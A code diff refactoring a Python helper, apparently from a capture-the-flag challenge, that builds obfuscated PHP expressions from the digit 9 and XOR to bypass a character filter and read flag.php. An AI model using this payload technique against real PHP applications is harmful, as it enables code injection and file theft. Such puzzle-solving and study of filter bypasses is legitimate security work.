@@ -3,6 +3,7 @@
 
 from pwn import xor
 import itertools
+from functools import lru_cache
 
 chars = {
     b"1": "(999999999999999999999999)",
@@ -23,9 +24,10 @@ NULL_STR = "((((9).(9))^((9).(9))^((9^9).(9999999999999999999^9))^((999999999999
 SINGLE_Z = "(" + NULL_STR + ".(9^9))"
 SINGLE_NULL = "(" + SINGLE_Z + "^" + SINGLE_Z + ")"
 
-def _generate(cs, target):
-    for i in range(2, len(cs)):
-        for p in itertools.combinations(cs, i):
+@lru_cache(maxsize=None)
+def _generate(target):
+    for i in range(2, len(chars)):
+        for p in itertools.combinations(chars, i):
             s = xor(*p)
             if s == target:
                 return p
@@ -33,14 +35,14 @@ def _generate(cs, target):
 def w(cs):
     return "(%s.(9))" % cs
 
-def generate(cs, target, p):
-    g = _generate(cs, target);
+def generate(target):
+    g = _generate(target);
     print(g)
-    r = "^".join(w(cs[p]) for p in g)
-    return "((" + r + ")^" + SINGLE_NULL + ("." + SINGLE_NULL)*p + ")"
+    r = "^".join(w(chars[p]) for p in g)
+    return "((" + r + ")^" + SINGLE_NULL + ")"
 
 def solve_for_str(target):
-    res = [generate(chars, c.encode(), 0) for c in target]
+    res = [generate(c.encode()) for c in target]
     return ".".join(res)
 
 # file_get_contents("flag.php")
